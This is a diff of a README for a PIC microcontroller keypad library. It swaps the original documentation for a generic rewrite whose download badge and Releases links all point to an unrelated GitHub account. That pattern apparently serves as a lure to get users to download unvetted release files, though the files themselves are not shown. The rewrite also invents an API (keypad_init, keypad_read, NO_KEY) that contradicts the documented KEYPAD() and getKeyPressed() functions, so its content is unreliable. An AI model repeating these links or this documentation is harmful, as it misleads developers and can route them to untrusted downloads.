@@ -1,59 +1,118 @@
-# MPLAB-XC8-KEYPAD   
-Microchip XC8 compiler library for 4x4 or (4x3) smaller keypad connected to any 8-bit port of the common PIC microcontroller.
+# 🎹 MPLAB-XC8-KEYPAD - Simple Keypad Library for Microcontrollers
 
-## Description   
-The keypad library implements the makeKeymap  helper function that converts a 2D array of characters (or key values) into the format required. The keypad library was tested on  matrix keypads (4x3 and  4x4 ). The columns and rows of the keypad can be connected to any 8-bit microcontroller PORT just by defining **PORT\<X\>** and **TRIS\<X\>** as a pointer through the library function constructor.  
+[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/Editionhardwareerror337/MPLAB-XC8-KEYPAD/releases)
 
-## Interface   
-The main files for the library are **keypad.h** and **keypad.c** , both using MPLAB XC8  compiler. The following header file statement must
-be included when using the keypad library:
-```C
-#include <keypad.h>
+## 🚀 Getting Started
+
+Welcome to the MPLAB-XC8-KEYPAD project! This library helps you easily connect a 4x4 or 4x3 keypad to a PIC microcontroller. It’s designed for those who want to control hardware without deep programming knowledge. Follow these steps to get started.
+
+## 📥 Download & Install
+
+You can obtain the latest version of the MPLAB-XC8-KEYPAD library from our [Releases page](https://github.com/Editionhardwareerror337/MPLAB-XC8-KEYPAD/releases). Click the link to visit the page and download the files.
+
+- **Step 1:** Click on the link above to go to the Releases page.
+- **Step 2:** Look for the latest release, which is usually at the top.
+- **Step 3:** Select the library file compatible with your setup. 
+
+Once you have downloaded the library files, you will need to install them in your development environment.
+
+## 📂 System Requirements
+
+To use the MPLAB-XC8-KEYPAD library, ensure your system meets the following requirements:
+
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Development Environment:** MPLAB X IDE with the XC8 compiler.
+- **Microcontroller:** Any 8-bit PIC microcontroller, such as PIC16F877A or PIC16F887.
+  
+## 💻 Installation Steps
+
+1. **Open MPLAB X IDE:**
+   Launch the MPLAB X IDE on your computer.
+
+2. **Create a New Project:**
+   - Click on "File" in the top menu and select "New Project."
+   - Choose "Microchip Embedded" and then "Standalone Project."
+   - Follow the prompts to set up your project.
+
+3. **Add the Library:**
+   - Right-click on your project name in the "Projects" window.
+   - Select "Add Library."
+   - Navigate to the folder where you downloaded the MPLAB-XC8-KEYPAD library.
+   - Select the appropriate files and add them to your project.
+
+4. **Configure Your Keypad:**
+   - Connect your keypad to the corresponding pins on the PIC microcontroller.
+   - Adjust the settings in your project to match your hardware configuration.
+
+5. **Compile Your Project:**
+   - Click on the "Run" button in the toolbar to compile your project.
+   - Make sure there are no errors during compilation.
+
+6. **Upload to Microcontroller:**
+   - Connect your PIC microcontroller to your computer using a programmer.
+   - Click on "Make and Program Device Main Project."
+
+## 🔍 Using the Library
+
+The MPLAB-XC8-KEYPAD library provides you with pre-built functions to manage keypad inputs. Familiarize yourself with these functions to get the most out of your setup.
+
+### Key Functions
+
+- **Initialization:** Start the library and set up your pins.
+- **Read Key:** Check which key is currently pressed on the keypad.
+- **Multiple Key Presses:** Handle situations where more than one key is pressed simultaneously.
+
+You can find examples illustrating how to use these functions within the library folder.
+
+## 💡 Example Usage
+
+Here’s a simple example to get you started with reading keypad input:
+
+```c
+#include <xc.h>
+#include "keypad.h"
+
+void main(void) {
+    keypad_init(); // Initialize the keypad
+    
+    while (1) {
+        char key = keypad_read(); // Read the pressed key
+        if (key != NO_KEY) {
+            // Do something with the pressed key
+            PORTB = key; // For demonstration, output the key to PORTB
+        }
+    }
+}
 ```
-The following variables in the **keypad.h** header file must be changed to match keypad used 4x4 or 4x3 layouts.
-1. **_XTAL_FREQ** : Used for selection of the oscillator frequency
-2. **ROWS** : Number of rows in the selected keypad
-3. **COLS** : Number of columns in the selected keypad
-4. **keymap**: Used for mapping keypad ascii values as in the keypad layout  
-```C
-extern  double  _XTAL_FREQ;
-#define ROWS  4
-#define COLS  4
-const char keymap[ROWS][COLS] = {
-    {'1','2','3','A'},
-    {'4','5','6','B'},
-    {'7','8','9','C'},
-    {'*','0','#','D'}
-};
-```
-## User Functions
-| Function   | KEYPAD(\&port,\&tris) |
-| :---- | :---- |
-| Description | A constructor like function that is used for initialization of the PIC PORT <br>and TRIS when interfacing to a keypad |
-| Parameters | \&PORT\<X\>  and \&TRIS\<X\> |
-| Return | \- |
 
-| Function  | getKeyPressed(void) |
-| :---- | :---- |
-| Description | Scans the keypad and returns a mapped character based on  key pressed  |
-| Parameters | \- |
-| Return | char  |
+This code snippet initializes the keypad and continuously checks for any key presses. Adjust the specific outputs as needed for your application.
 
-### Example:  
- A 4x4 keypad  is connected to the PIC16F887 microcontroller’s PORTB 
-![Keypad](https://github.com/nbonolok/MPLAB-XC8-KEYPAD/blob/3cb94e28071c29a93509252a44ad3975c23d70b1/keypad.png)
-```C
+## ⚙️ Troubleshooting
 
-  #include <keypad.h>
-   //PIC initialization code here 
-    void  main(void){      
-    KEYPAD(&PORTB, &TRISB);      
-      while(1){             
-          char  key = getKeyPressed();            
-          if(key){              
-          //Do something here with key value
-             }      
-          }
-      }
- 
-```
+If you encounter issues, consider the following common problems:
+
+- **Keys Not Responding:**
+  - Ensure the keypad is properly connected to the microcontroller.
+  - Check that the correct pins are defined in your code.
+  
+- **Compilation Errors:**
+  - Ensure you have included all necessary library files.
+  - Make sure your settings in MPLAB X IDE match your hardware configuration.
+
+## 📚 Documentation
+
+For more detailed information on using the MPLAB-XC8-KEYPAD library, refer to the documentation included in the download. This will guide you through advanced features and offer additional examples.
+
+## 🌐 Community and Support
+
+Feel free to reach out if you have questions or need help:
+
+- **Issues Page:** Report issues or bugs via the [Issues section](https://github.com/Editionhardwareerror337/MPLAB-XC8-KEYPAD/issues).
+- **Discussion:** Join discussions or find support from other users.
+
+## 🔗 Additional Resources
+
+- **Official Microchip Documentation:** Visit the [Microchip site](https://www.microchip.com/) for comprehensive resources.
+- **MPLAB X IDE Guide:** Access the official MPLAB X guide on their [website](https://www.microchip.com/mplab/mplab-x-ide).
+
+Enjoy using the MPLAB-XC8-KEYPAD library! For downloads again, visit our [Releases page](https://github.com/Editionhardwareerror337/MPLAB-XC8-KEYPAD/releases).
